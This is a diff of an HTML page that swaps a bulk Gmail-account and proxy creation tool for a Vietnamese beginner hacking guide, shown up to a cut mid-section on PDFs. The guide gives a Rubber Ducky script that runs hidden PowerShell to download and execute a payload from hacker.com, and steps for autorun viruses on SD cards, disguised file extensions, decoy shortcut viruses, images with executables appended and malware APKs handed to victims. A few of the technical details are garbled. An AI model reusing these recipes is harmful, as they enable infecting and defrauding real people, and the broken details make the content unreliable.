@@ -3,490 +3,676 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>G-Creator Pro - Tạo Proxy + Gmail Hàng Loạt</title>
+    <title>Học Hacker Siêu Đơn Giản - Tổng Hợp Toàn Bộ - Thiết Bị Hack - AI - File Types</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: linear-gradient(135deg, #0a0e1a, #141b2b);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            min-height: 100vh;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0a; color: #00ff00; line-height: 1.8; padding: 10px;
         }
         .container {
-            max-width: 750px;
-            width: 100%;
-            background: rgba(255,255,255,0.04);
-            backdrop-filter: blur(16px);
-            border: 1px solid rgba(255,255,255,0.08);
-            border-radius: 36px;
-            padding: 35px 30px;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
+            max-width: 900px; margin: 0 auto; background: #111;
+            border: 2px solid #00ff00; border-radius: 15px; padding: 25px;
         }
         h1 {
-            color: #fff;
-            font-size: 28px;
-            font-weight: 700;
-            text-align: center;
-            letter-spacing: 0.5px;
+            text-align: center; color: #00ff00; font-size: 26px;
+            border-bottom: 3px solid #00ff00; padding-bottom: 15px; margin-bottom: 20px;
         }
-        h1 span {
-            color: #64ffda;
+        h2 {
+            color: #ffaa00; font-size: 22px; margin: 30px 0 15px;
+            padding: 12px; background: #1a1a00; border-left: 5px solid #ffaa00;
+            border-radius: 0 10px 10px 0;
         }
-        .sub {
-            text-align: center;
-            color: #8892b0;
-            font-size: 14px;
-            margin: 6px 0 28px;
-            padding-bottom: 18px;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
+        h3 {
+            color: #00ccff; font-size: 18px; margin: 20px 0 10px;
+            border-bottom: 1px dashed #00ccff; padding-bottom: 5px;
         }
-        .tab-wrap {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 25px;
+        .box {
+            background: #1a1a1a; padding: 18px; border-radius: 10px;
+            margin: 15px 0; border: 1px solid #333;
         }
-        .tab-btn {
-            flex: 1;
-            padding: 12px 0;
-            background: transparent;
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 14px;
-            color: #8892b0;
-            font-weight: 600;
-            font-size: 15px;
-            cursor: pointer;
-            transition: 0.3s;
+        .box-red { border-left: 4px solid #ff4444; }
+        .box-green { border-left: 4px solid #00ff00; }
+        .box-blue { border-left: 4px solid #0088ff; }
+        .box-yellow { border-left: 4px solid #ffaa00; }
+        .box-purple { border-left: 4px solid #aa00ff; }
+        .box-cyan { border-left: 4px solid #00cccc; }
+        pre {
+            background: #000; padding: 15px; border-radius: 8px;
+            border: 1px solid #333; margin: 10px 0; font-size: 12px;
+            overflow-x: auto; color: #00ff00; font-family: 'Courier New', monospace;
         }
-        .tab-btn.active {
-            background: rgba(100, 255, 218, 0.12);
-            border-color: #64ffda;
-            color: #64ffda;
-            box-shadow: 0 0 20px rgba(100, 255, 218, 0.05);
+        code {
+            background: #000; padding: 3px 8px; border-radius: 4px;
+            color: #ff6b6b; font-family: 'Courier New', monospace; font-size: 12px;
         }
-        .tab-btn:hover {
-            background: rgba(255,255,255,0.05);
+        .keyword {
+            display: inline-block; padding: 4px 10px; border-radius: 15px;
+            margin: 3px; font-weight: bold; font-size: 12px;
         }
-        .panel {
-            display: none;
-            animation: fade 0.3s ease;
+        .k-black { background: #ff0000; color: #fff; }
+        .k-white { background: #00ff00; color: #000; }
+        .k-grey { background: #888; color: #fff; }
+        .k-blue { background: #0088ff; color: #fff; }
+        .k-red { background: #cc0000; color: #fff; }
+        .k-purple { background: #8800cc; color: #fff; }
+        .k-yellow { background: #ccaa00; color: #000; }
+        table {
+            width: 100%; border-collapse: collapse; margin: 15px 0; font-size: 12px;
         }
-        .panel.active {
-            display: block;
+        th, td {
+            border: 1px solid #333; padding: 8px; text-align: left;
         }
-        @keyframes fade {
-            from { opacity: 0; transform: translateY(6px); }
-            to { opacity: 1; transform: translateY(0); }
+        th { background: #1a1a1a; color: #ffaa00; font-size: 13px; }
+        .step {
+            background: #0a1a0a; padding: 12px; border-radius: 10px;
+            margin: 10px 0; border: 1px solid #00ff00;
         }
-        .form-group {
-            margin-bottom: 20px;
+        .step-num {
+            display: inline-block; background: #00ff00; color: #000;
+            width: 28px; height: 28px; text-align: center; line-height: 28px;
+            border-radius: 50%; font-weight: bold; margin-right: 8px;
         }
-        label {
-            display: block;
-            color: #ccd6f6;
-            font-size: 14px;
-            font-weight: 500;
-            margin-bottom: 5px;
+        .note {
+            background: #1a1a00; border: 1px solid #ffaa00;
+            padding: 12px; border-radius: 8px; margin: 12px 0; color: #ffaa00;
         }
-        input, textarea, select {
-            width: 100%;
-            padding: 13px 16px;
-            background: rgba(255,255,255,0.05);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 14px;
-            color: #e6f1ff;
-            font-size: 15px;
-            outline: none;
-            transition: 0.25s;
+        .warning {
+            background: #1a0000; border: 1px solid #ff0000;
+            padding: 12px; border-radius: 8px; margin: 12px 0; color: #ff6666;
         }
-        input:focus, textarea:focus, select:focus {
-            border-color: #64ffda;
-            background: rgba(100,255,218,0.03);
-            box-shadow: 0 0 0 3px rgba(100,255,218,0.08);
+        .hacker-card {
+            background: #0d0d1a; border: 1px solid #ffaa00;
+            padding: 15px; border-radius: 10px; margin: 15px 0;
         }
-        .row-2 {
-            display: flex;
-            gap: 16px;
-        }
-        .row-2 .form-group {
-            flex: 1;
-        }
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin: 8px 0 16px;
-        }
-        .checkbox-group input {
-            width: 20px;
-            height: 20px;
-            accent-color: #64ffda;
-            cursor: pointer;
-        }
-        .checkbox-group label {
-            margin: 0;
-            color: #a8b2d1;
-            font-size: 14px;
-            cursor: pointer;
-        }
-        .btn-group {
-            display: flex;
-            gap: 14px;
-            margin-top: 22px;
-        }
-        .btn {
-            flex: 1;
-            padding: 15px 10px;
-            border: none;
-            border-radius: 16px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.25s;
-            letter-spacing: 0.3px;
-        }
-        .btn-primary {
-            background: #64ffda;
-            color: #0a0e1a;
-        }
-        .btn-primary:hover {
-            background: #52e0c0;
-            transform: scale(1.02);
-            box-shadow: 0 8px 25px rgba(100,255,218,0.2);
-        }
-        .btn-danger {
-            background: rgba(255,80,80,0.12);
-            color: #ff6b6b;
-            border: 1px solid rgba(255,80,80,0.15);
-        }
-        .btn-danger:hover {
-            background: rgba(255,80,80,0.2);
-        }
-        .btn-secondary {
-            background: rgba(255,255,255,0.06);
-            color: #a8b2d1;
-            border: 1px solid rgba(255,255,255,0.08);
-        }
-        .btn-secondary:hover {
-            background: rgba(255,255,255,0.1);
-        }
-        .log-area {
-            margin-top: 25px;
-            background: rgba(0,0,0,0.5);
-            border-radius: 16px;
-            padding: 16px 18px;
-            max-height: 220px;
-            overflow-y: auto;
-            border: 1px solid rgba(255,255,255,0.04);
-        }
-        .log-area p {
-            color: #8a9bb5;
-            font-size: 13px;
-            font-family: 'Courier New', monospace;
-            line-height: 1.7;
-            margin: 0;
-            padding: 2px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.02);
-        }
-        .log-success { color: #64ffda !important; }
-        .log-error { color: #ff6b6b !important; }
-        .log-info { color: #64b5f6 !important; }
-        .log-warn { color: #ffd93d !important; }
-        .status-bar {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 12px;
-            color: #495670;
-            font-size: 13px;
-        }
-        .status-bar .dot {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            margin-right: 8px;
-        }
-        .dot.idle { background: #495670; }
-        .dot.running { background: #64ffda; box-shadow: 0 0 12px #64ffda; }
-        .dot.stopped { background: #ff6b6b; }
-        .proxy-list-box {
-            background: rgba(0,0,0,0.3);
-            border-radius: 12px;
-            padding: 10px 14px;
-            max-height: 120px;
-            overflow-y: auto;
-            font-size: 13px;
-            color: #a8b2d1;
-            font-family: monospace;
-            border: 1px solid rgba(255,255,255,0.05);
-            margin-top: 8px;
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
-        .badge-count {
-            background: rgba(100,255,218,0.12);
-            color: #64ffda;
-            padding: 2px 12px;
-            border-radius: 30px;
-            font-size: 12px;
-            font-weight: 600;
-        }
-        @media (max-width: 550px) {
-            .row-2 { flex-direction: column; gap: 0; }
-            .container { padding: 22px 16px; }
-            .tab-wrap { flex-direction: column; }
-        }
-        .log-area::-webkit-scrollbar { width: 4px; }
-        .log-area::-webkit-scrollbar-track { background: transparent; }
-        .log-area::-webkit-scrollbar-thumb { background: #64ffda; border-radius: 10px; }
-        .proxy-list-box::-webkit-scrollbar { width: 3px; }
-        .proxy-list-box::-webkit-scrollbar-thumb { background: #64ffda; border-radius: 10px; }
     </style>
 </head>
 <body>
-<div class="container">
-    <h1>⚡ G-<span>CREATOR</span> PRO</h1>
-    <div class="sub">Tạo proxy thật + Tạo Gmail hàng loạt · Tích hợp 1 chạm</div>
+    <div class="container">
 
-    <!-- Tab -->
-    <div class="tab-wrap">
-        <button class="tab-btn active" data-tab="tabProxy">🌐 Tạo Proxy</button>
-        <button class="tab-btn" data-tab="tabGmail">📧 Tạo Gmail</button>
-    </div>
+        <h1>📱 HỌC HACKER SIÊU ĐƠN GIẢN - TỔNG HỢP TOÀN BỘ</h1>
+        <p style="text-align:center;color:#ffaa00;">Thiết bị Hack - AI - File Types - Thẻ Nhớ SD - Virus USB</p>
 
-    <!-- PANEL 1: TẠO PROXY -->
-    <div id="tabProxy" class="panel active">
-        <div class="form-group">
-            <label>Số lượng proxy muốn có (sau khi lọc)</label>
-            <input type="number" id="proxySoLuong" value="30" min="5" max="200">
-        </div>
-        <div class="form-group">
-            <label>Timeout kiểm tra (giây)</label>
-            <input type="number" id="proxyTimeout" value="5" min="2" max="15">
-        </div>
-        <div class="checkbox-group">
-            <input type="checkbox" id="proxyGhiFile" checked>
-            <label for="proxyGhiFile">Tự động ghi vào <strong>proxy.txt</strong> (dùng cho tạo Gmail)</label>
-        </div>
-        <div class="btn-group">
-            <button class="btn btn-primary" id="btnLayProxy">🔍 LẤY PROXY</button>
-            <button class="btn btn-secondary" id="btnXemProxy">👁 Xem danh sách</button>
-        </div>
-        <div id="proxyDisplay" class="proxy-list-box" style="display:none; margin-top:15px;">-- chưa có --</div>
-    </div>
+        <!-- ========== THIẾT BỊ DÙNG ĐỂ HACK ========== -->
+        <h2>🔧 PHẦN 1: CÁC THIẾT BỊ DÙNG ĐỂ HACK</h2>
 
-    <!-- PANEL 2: TẠO GMAIL -->
-    <div id="tabGmail" class="panel">
-        <div class="row-2">
-            <div class="form-group">
-                <label>Số lượng tài khoản</label>
-                <input type="number" id="gmailSoLuong" value="10" min="1" max="50">
+        <div class="box box-red">
+            <h3>1. USB Rubber Ducky - Bàn phím giả lập</h3>
+            <p><b>Là gì:</b> USB trông giống ổ flash thông thường, nhưng máy tính nhận diện là <b>bàn phím</b>. Nó tự động gõ lệnh với tốc độ siêu nhanh (1000 từ/phút).</p>
+            <pre>
+# CÁCH USB RUBBER DUCKY HOẠT ĐỘNG:
+1. Cắm USB vào máy tính
+2. Máy tính nhận diện: "Đây là bàn phím HID"
+3. USB bắt đầu "gõ" các lệnh đã được lập trình sẵn
+4. Tốc độ gõ: 1000 ký tự/phút (nhanh hơn người gõ 100 lần)
+
+# KỊCH BẢN TẤN CÔNG MẪU:
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 500
+STRING IEX (New-Object Net.WebClient).DownloadString('http://hacker.com/payload.ps1')
+ENTER
+
+# Kịch bản trên làm gì?
+1. Đợi 1 giây
+2. Nhấn Windows + R (mở hộp thoại Run)
+3. Gõ lệnh mở PowerShell ẩn
+4. Tải và chạy mã độc từ server hacker
+5. Nạn nhân KHÔNG nhìn thấy gì (PowerShell ẩn)
+
+# CÁCH PHÒNG CHỐNG:
+✅ Khóa máy khi rời đi
+✅ Không cắm USB lạ vào máy
+✅ Tắt AutoRun trong Windows
+✅ Dùng phần mềm chặn thiết bị HID lạ</pre>
+        </div>
+
+        <div class="box box-red">
+            <h3>2. Flipper Zero - "Công cụ đa năng của hacker"</h3>
+            <p><b>Là gì:</b> Thiết bị cầm tay giống máy chơi game, có thể hack: RFID, NFC, Bluetooth, WiFi, Remote TV/AC, Cửa từ, Thẻ từ...</p>
+            <pre>
+# FLIPPER ZERO CÓ THỂ LÀM GÌ?
+
+1. ĐỌC/SAO CHÉP THẺ TỪ (RFID/NFC):
+   - Quẹt Flipper vào thẻ ra vào tòa nhà
+   - Copy UID của thẻ
+   - Phát lại để mở cửa
+   - Lưu trữ nhiều thẻ trong bộ nhớ
+
+2. MỞ KHÓA CỬA XE Ô TÔ:
+   - Bắt tín hiệu remote car key (Sub-GHz)
+   - Phát lại để mở khóa xe
+   - Hoạt động với tần số 315MHz, 433MHz, 868MHz
+
+3. ĐIỀU KHIỂN TV/ĐIỀU HÒA:
+   - Thư viện hồng ngoại (IR) khổng lồ
+   - Bật/tắt TV, đổi kênh hàng loạt
+   - Troll bạn bè, quán cafe
+
+4. BẮT TÍN HIỆU BLUETOOTH:
+   - Quét thiết bị Bluetooth xung quanh
+   - Spam thông báo đến iPhone (BLE spam)
+   - Gây crash một số điện thoại cũ
+
+5. BAD USB MODE:
+   - Giống Rubber Ducky
+   - Cắm Flipper vào máy tính qua USB
+   - Tự động gõ lệnh đã lập trình
+
+6. WIFI DEAUTH:
+   - Gửi gói deauth để đá thiết bị khỏi WiFi
+   - Tạo mạng WiFi giả mạo (Evil Twin)
+
+# GIÁ FLIPPER ZERO: ~$169 - $200
+# CÓ HỢP PHÁP KHÔNG? 
+- Thiết bị hợp pháp để mua/bán
+- NHƯNG dùng để hack người khác là PHẠM PHÁP</pre>
+        </div>
+
+        <div class="box box-red">
+            <h3>3. Raspberry Pi - Máy tính siêu nhỏ</h3>
+            <p><b>Là gì:</b> Máy tính Linux kích thước bằng thẻ tín dụng, giá $35, dùng để build công cụ hack di động.</p>
+            <pre>
+# RASPBERRY PI DÙNG ĐỂ HACK NHƯ THẾ NÀO?
+
+1. KALI LINUX TRÊN RASPBERRY PI:
+   - Cài Kali Linux ARM
+   - Có tất cả tool hacking: Metasploit, Nmap, Wireshark
+   - Nhỏ gọn, bỏ túi, cắm điện là chạy
+
+2. P4WNPI (WiFi Hacking Tool):
+   - Biến Raspberry Pi thành máy hack WiFi
+   - Tự động bắt handshake WPA2
+   - Crack password với GPU tích hợp
+
+3. POCKET PENTEST KIT:
+   - Raspberry Pi + Pin dự phòng + Màn hình nhỏ
+   - Cắm vào mạng LAN của công ty
+   - Tự động scan và khai thác lỗ hổng
+
+4. VPN GATEWAY BÍ MẬT:
+   - Cắm Raspberry Pi vào router
+   - Tạo đường hầm VPN cho hacker từ xa
+   - Không ai phát hiện
+
+5. KEYLOGGER PHẦN CỨNG:
+   - Raspberry Pi Zero + USB adapter
+   - Cắm giữa bàn phím và máy tính
+   - Ghi lại mọi phím bấm</pre>
+        </div>
+
+        <div class="box box-red">
+            <h3>4. WiFi Pineapple - Giả mạo WiFi</h3>
+            <p><b>Là gì:</b> Thiết bị tạo ra mạng WiFi giả mạo, khi nạn nhân kết nối vào, mọi dữ liệu đều bị chặn.</p>
+            <pre>
+# CÁCH WIFI PINEAPPLE HOẠT ĐỘNG:
+
+1. TẠO EVIL TWIN (Sinh đôi độc ác):
+   - Pineapple tạo WiFi giả: "Starbucks_Free_WiFi"
+   - Nạn nhân thấy 2 WiFi giống hệt nhau
+   - 1 thật, 1 giả (của Pineapple)
+
+2. KHI NẠN NHÂN KẾT NỐI:
+   - Mọi request web đi qua Pineapple
+   - Đọc được mọi thứ: email, mật khẩu, cookie
+   - Có thể chèn malware vào trang web
+
+3. CAPTIVE PORTAL GIẢ:
+   - Hiện trang đăng nhập giả: "Đăng nhập Facebook để dùng WiFi"
+   - Nạn nhân nhập user/pass → Gửi về hacker
+
+4. SSL STRIP:
+   - Ép kết nối HTTPS → HTTP (bỏ mã hóa)
+   - Đọc được dữ liệu ngân hàng, email</pre>
+        </div>
+
+        <div class="box box-red">
+            <h3>5. HackRF One - SDR (Software Defined Radio)</h3>
+            <p><b>Là gì:</b> Thiết bị thu/phát sóng vô tuyến, có thể bắt và giả mạo tín hiệu radio từ 1MHz đến 6GHz.</p>
+            <pre>
+# HACKRF CÓ THỂ LÀM GÌ?
+
+1. NGHE LÉN RADIO:
+   - Cảnh sát, taxi, máy bay, tàu hỏa
+   - Tần số 100MHz - 500MHz
+
+2. GIẢ MẠO TÍN HIỆU:
+   - Mở cửa garage, cổng từ xa
+   - Phát tín hiệu car key fob
+
+3. BẮT TÍN HIỆU ĐIỆN THOẠI:
+   - IMSI Catcher (giả trạm BTS)
+   - Bắt số điện thoại, tin nhắn SMS
+   - (Cần kiến thức chuyên sâu)
+
+4. GPS SPOOFING:
+   - Giả mạo tín hiệu GPS
+   - Khiến drone/điện thoại nghĩ đang ở vị trí khác</pre>
+        </div>
+
+        <!-- ========== THẺ NHỚ SD ========== -->
+        <h2>💾 PHẦN 2: THẺ NHỚ SD - CÁCH HACK VÀ CÀI VIRUS</h2>
+
+        <div class="box box-yellow">
+            <h3>1. Thẻ nhớ SD là gì? Dùng để làm gì?</h3>
+            <table>
+                <tr><th>Loại thẻ</th><th>Kích thước</th><th>Dung lượng</th><th>Dùng cho</th></tr>
+                <tr><td>SD</td><td>32x24mm</td><td>Đến 2GB</td><td>Máy ảnh cũ</td></tr>
+                <tr><td>SDHC</td><td>32x24mm</td><td>4GB-32GB</td><td>Máy ảnh, laptop</td></tr>
+                <tr><td>SDXC</td><td>32x24mm</td><td>64GB-2TB</td><td>Camera 4K, drone</td></tr>
+                <tr><td>MicroSD</td><td>15x11mm</td><td>Đến 1TB</td><td>Điện thoại, tablet</td></tr>
+            </table>
+        </div>
+
+        <div class="box box-red">
+            <h3>2. Cách cài virus vào thẻ nhớ SD</h3>
+            
+            <div class="step">
+                <span class="step-num">1</span><b>Autorun Virus (Windows):</b>
+                <pre># Tạo file autorun.inf trên thẻ SD:
+[AutoRun]
+open=virus.exe
+icon=virus.exe,0
+action=Open folder to view files
+label=My Photos
+
+# Khi nạn nhân cắm thẻ vào máy tính:
+# 1. Windows đọc autorun.inf
+# 2. Tự động chạy virus.exe
+# 3. Máy bị nhiễm
+
+# CÁCH TẠO:
+# 1. Viết virus.exe (bằng Python, C#, hoặc batch)
+# 2. Copy virus.exe vào thẻ SD
+# 3. Tạo file autorun.inf với nội dung trên
+# 4. Đặt thuộc tính ẩn (Hidden) cho cả 2 file
+# 5. Khi cắm vào máy → Virus tự chạy</pre>
             </div>
-            <div class="form-group">
-                <label>Mật khẩu</label>
-                <input type="text" id="gmailMatKhau" value="Abc@123456">
+
+            <div class="step">
+                <span class="step-num">2</span><b>Fake File Extension (Giả mạo đuôi file):</b>
+                <pre># KỸ THUẬT: Đảo ngược tên file Unicode (Right-to-Left Override)
+# Dùng ký tự đặc biệt U+202E để đảo ngược tên file
+
+# VÍ DỤ:
+# File thật: "photo.jpg" + U+202E + "exe.scr"
+# Windows hiển thị: "photo.scr.jpg"
+# Nhưng thực chất là file .scr (executable)!
+
+# CÁCH TẠO:
+# 1. Chuẩn bị virus.exe
+# 2. Đổi tên: "HinhAnh\u202Escr.exe"
+#    (Windows sẽ hiển thị là "HinhAnhexe.scr" ???)
+# 3. Để trong thẻ SD cùng với ảnh thật
+# 4. Nạn nhân click mở "ảnh" → Chạy virus</pre>
+            </div>
+
+            <div class="step">
+                <span class="step-num">3</span><b>Shortcut Virus (LNK Exploit):</b>
+                <pre># TẠO SHORTCUT ĐỘC HẠI:
+# 1. Tạo file virus.bat:
+@echo off
+start /b virus.exe
+start "" "C:\Program Files\Windows Photo Viewer\ImagingDevices.exe" "real_photo.jpg"
+
+# 2. Tạo shortcut trỏ đến virus.bat
+# 3. Đổi icon của shortcut thành icon thư mục/ảnh
+# 4. Đặt tên: "Ảnh cưới" hoặc "Tài liệu quan trọng"
+
+# KHI NẠN NHÂN CLICK:
+# - Virus chạy ngầm
+# - Ảnh thật mở ra (để đánh lừa)
+# - Nạn nhân không nghi ngờ gì</pre>
+            </div>
+
+            <div class="step">
+                <span class="step-num">4</span><b>BadUSB Firmware Attack (Nâng cao):</b>
+                <pre># SỬA FIRMWARE CỦA THẺ NHỚ:
+# Một số thẻ SD có bộ điều khiển có thể lập trình lại
+
+# KHI CẮM THẺ VÀO:
+# 1. Thẻ SD giả làm thiết bị HID (bàn phím)
+# 2. Tự động gõ lệnh tải malware
+# 3. Sau đó chuyển sang chế độ lưu trữ bình thường
+
+# CÔNG CỤ: SD-Card Hack, EvilSD
+# YÊU CẦU: Kiến thức về firmware, vi điều khiển</pre>
+            </div>
+
+            <div class="step">
+                <span class="step-num">5</span><b>Payload trong file ảnh/video:</b>
+                <pre># KỸ THUẬT STEGANOGRAPHY (Ẩn mã độc trong ảnh):
+# 1. Tạo file ảnh bình thường: cat.jpg
+# 2. Ẩn mã độc vào ảnh:
+#    Windows: copy /b cat.jpg + virus.exe secret.jpg
+#    Linux: cat cat.jpg virus.exe > secret.jpg
+
+# 3. File secret.jpg vẫn mở được như ảnh bình thường!
+# 4. Nhưng bên trong chứa virus.exe
+# 5. Khi chạy script giải nén, virus sẽ được tách ra
+
+# SCRIPT GIẢI NÉN VÀ CHẠY:
+# extract_virus.bat:
+@echo off
+type secret.jpg | findstr /v "JFIF" > virus.exe
+start virus.exe</pre>
             </div>
         </div>
-        <div class="form-group">
-            <label>Tiền tố username</label>
-            <input type="text" id="gmailTienTo" value="zepdry">
+
+        <div class="box box-red">
+            <h3>3. Cách hack điện thoại qua thẻ nhớ SD</h3>
+            <pre>
+# CÁCH 1: MALWARE APK TRONG THẺ NHỚ
+# 1. Tạo file virus.apk (Android malware)
+# 2. Copy vào thẻ SD với tên hấp dẫn:
+#    - "Game_hay.apk"
+#    - "Crack_Spotify.apk"
+#    - "Mod_YouTube.apk"
+# 3. Đưa thẻ SD cho nạn nhân
+# 4. Khi họ cài APK → Điện thoại bị nhiễm
+
+# CÁCH 2: EXPLOIT QUA FILE ẢNH/VIDEO
+# 1. Nhúng payload vào file MP4/PNG
+# 2. Khi nạn nhân mở file bằng app yếu
+# 3. App bị crash → Thực thi payload
+# 4. Ví dụ: Stagefright (Android)
+
+# CÁCH 3: SYMBOLIC LINK ATTACK
+# 1. Tạo symbolic link trong thẻ SD
+# 2. Trỏ đến file hệ thống nhạy cảm
+# 3. Khi app đọc thẻ SD, vô tình đọc file hệ thống
+
+# CÁCH PHÒNG CHỐNG:
+✅ Không cắm thẻ SD lạ vào máy
+✅ Tắt AutoRun/AutoPlay trong Windows
+✅ Không cài APK từ nguồn lạ
+✅ Quét virus thẻ SD trước khi mở
+✅ Format thẻ SD lạ trước khi dùng</pre>
         </div>
-        <div class="form-group">
-            <label>File proxy sử dụng (mặc định: proxy.txt)</label>
-            <input type="text" id="gmailProxyFile" value="proxy.txt">
+
+        <!-- ========== CÁCH HOẠT ĐỘNG CỦA AI ========== -->
+        <h2>🤖 PHẦN 3: CÁCH HOẠT ĐỘNG CỦA AI (Trí Tuệ Nhân Tạo)</h2>
+
+        <div class="box box-blue">
+            <h3>1. AI là gì? (Giải thích siêu đơn giản)</h3>
+            <p><b>Tưởng tượng:</b> Bạn dạy 1 đứa trẻ phân biệt chó và mèo. Bạn cho nó xem 10,000 ảnh chó và 10,000 ảnh mèo. Sau đó nó tự nhận biết được. <b>Đó là cách AI học!</b></p>
+            <pre>
+# CÁC LOẠI AI:
+
+1. AI HẸP (Narrow AI - ANI):
+   - AI chỉ giỏi 1 việc
+   - Ví dụ: ChatGPT, Siri, Google Translate
+   - KHÔNG có ý thức, chỉ làm theo huấn luyện
+
+2. AI TỔNG QUÁT (General AI - AGI):
+   - AI ngang bằng con người
+   - Có thể làm mọi việc con người làm
+   - CHƯA TỒN TẠI (dự đoán 2050-2070)
+
+3. AI SIÊU VIỆT (Super AI - ASI):
+   - AI thông minh hơn toàn bộ nhân loại
+   - Có thể tự cải thiện bản thân
+   - CHƯA TỒN TẠI (nguy hiểm tiềm tàng)</pre>
         </div>
-        <div class="checkbox-group">
-            <input type="checkbox" id="gmailHeadless" checked>
-            <label for="gmailHeadless">Chạy nền (headless) - tăng tốc</label>
+
+        <div class="box box-blue">
+            <h3>2. Machine Learning (Máy học) hoạt động thế nào?</h3>
+            <pre>
+# QUY TRÌNH MACHINE LEARNING:
+
+BƯỚC 1: THU THẬP DỮ LIỆU (Data Collection)
+- Ảnh: 1 triệu ảnh chó mèo
+- Text: Toàn bộ Wikipedia, sách, web
+- Số: Giá cổ phiếu 10 năm qua
+
+BƯỚC 2: GẮN NHÃN (Labeling)
+- Ảnh 1: [Chó]
+- Ảnh 2: [Mèo]
+- Ảnh 3: [Chó]
+...lặp lại 1 triệu lần
+
+BƯỚC 3: HUẤN LUYỆN (Training)
+- Cho AI xem ảnh → AI đoán → So sánh với nhãn
+- Sai → Điều chỉnh "nơ-ron" (weight)
+- Đúng → Củng cố
+- Lặp lại hàng triệu lần
+
+BƯỚC 4: KIỂM TRA (Testing)
+- Cho AI xem ảnh MỚI (chưa từng thấy)
+- Nếu đoán đúng >95% → Thành công!
+
+# VÍ DỤ NEURAL NETWORK ĐƠN GIẢN:
+Input (ảnh) → [Lớp 1] → [Lớp 2] → [Lớp 3] → Output (Chó/Mèo)
+              (phát hiện  (phát hiện  (phát hiện
+               cạnh)       hình dạng)   đặc điểm)</pre>
         </div>
-        <div class="btn-group">
-            <button class="btn btn-primary" id="btnTaoGmail">🚀 BẮT ĐẦU TẠO</button>
-            <button class="btn btn-danger" id="btnDungGmail">⏹ DỪNG LẠI</button>
+
+        <div class="box box-red">
+            <h3>3. AI dùng để hack như thế nào?</h3>
+            <pre>
+# CÁCH HACKER DÙNG AI:
+
+1. TẠO PHISHING EMAIL SIÊU THẬT:
+   - ChatGPT viết email lừa đảo không lỗi chính tả
+   - Bắt chước văn phong của sếp/người thân
+   - Tỉ lệ thành công cao hơn 300%
+
+2. CRACK MẬT KHẨU NHANH HƠN:
+   - AI dự đoán mật khẩu dựa trên thói quen
+   - Hashcat + AI = Crack nhanh gấp 10 lần
+   - Dự đoán pattern: "TenCongTy2024!"
+
+3. DEEPFAKE (Giả mạo video/giọng nói):
+   - Giả làm CEO gọi video yêu cầu chuyển tiền
+   - Vụ lừa đảo $243,000 ở Anh (2019)
+   - Deepfake audio + video
+
+4. TỰ ĐỘNG TÌM LỖ HỔNG:
+   - AI quét code tìm bug (như CodeQL, Semgrep)
+   - Tự động sinh exploit từ mô tả lỗ hổng
+   - GPT-4 có thể viết malware theo yêu cầu
+
+5. BYPASS CAPTCHA:
+   - AI nhận diện chữ méo, ảnh giao thông
+   - Độ chính xác >99%
+   - Vượt qua reCAPTCHA tự động
+
+6. SOCIAL ENGINEERING AI:
+   - AI chatbot gọi điện lừa đảo 24/7
+   - Giọng nói tự nhiên, phản ứng thông minh
+   - Lừa hàng nghìn người cùng lúc</pre>
         </div>
+
+        <div class="box box-green">
+            <h3>4. AI trong bảo mật (Phòng thủ)</h3>
+            <pre>
+# AI GIÚP PHÒNG THỦ NHƯ THẾ NÀO?
+
+1. PHÁT HIỆN BẤT THƯỜNG:
+   - AI quét 1 triệu events/giây
+   - Phát hiện hành vi lạ: Đăng nhập lúc 3h sáng
+   - Cảnh báo real-time
+
+2. PHÂN TÍCH MALWARE:
+   - AI phân tích file nghi ngờ trong sandbox
+   - Phát hiện malware chưa từng thấy (zero-day)
+   - Học từ hàng triệu mẫu malware
+
+3. DỰ ĐOÁN TẤN CÔNG:
+   - AI dự đoán mục tiêu tiếp theo của hacker
+   - Phân tích pattern tấn công
+   - Chủ động vá lỗ hổng</pre>
+        </div>
+
+        <!-- ========== CÁC LOẠI FILE ========== -->
+        <h2>📁 PHẦN 4: CÁC LOẠI FILE - CÔNG DỤNG VÀ CÁCH HACK</h2>
+
+        <div class="box box-yellow">
+            <h3>1. File .TXT (Text - Văn bản thuần)</h3>
+            <pre>
+# CÔNG DỤNG:
+- Lưu văn bản không định dạng
+- Ghi chú, log, code, config
+- Có thể mở bằng mọi trình soạn thảo
+
+# CÁCH HACK QUA FILE .TXT:
+1. Giả mạo đuôi file: virus.txt.exe (Windows ẩn .exe)
+2. Nhúng script độc: file.txt chứa mã PowerShell
+3. Unicode homograph: Dùng ký tự trông giống chữ cái
+4. File .txt quá lớn gây crash Notepad
+5. Macro trong file .txt mở bằng Word</pre>
+        </div>
+
+        <div class="box box-yellow">
+            <h3>2. File .PDF (Portable Document Format)</h3>
+            <pre>
+# CÔNG DỤNG:
+- Tài liệu không thay đổi định dạng
+- Hỗ trợ form, chữ ký số, multimedia
+- Chuẩn công nghiệp cho văn bản
+
+# CÁCH HACK QUA FILE .PDF:
+1. NHÚNG JAVASCRIPT ĐỘC:
+   - PDF có thể chứa JavaScript
+   - Mở file → Script tự chạy
+   - Tải malware, đánh cắp dữ liệu
+
+2. EXPLOIT LỖ HỔNG ADOBE READER:
+   - CVE-2021-28550: Buffer overflow
+   - Mở PDF → Thực thi mã từ xa
+   - Không cần click thêm gì
+
+3. PDF PHISHING:
+   - Giả mạo hóa đơn, hợp đồng
+   - Chứa link đến trang phishing
+   - Form điền thông tin giả
+
+4. ẨN FILE TRONG PDF:
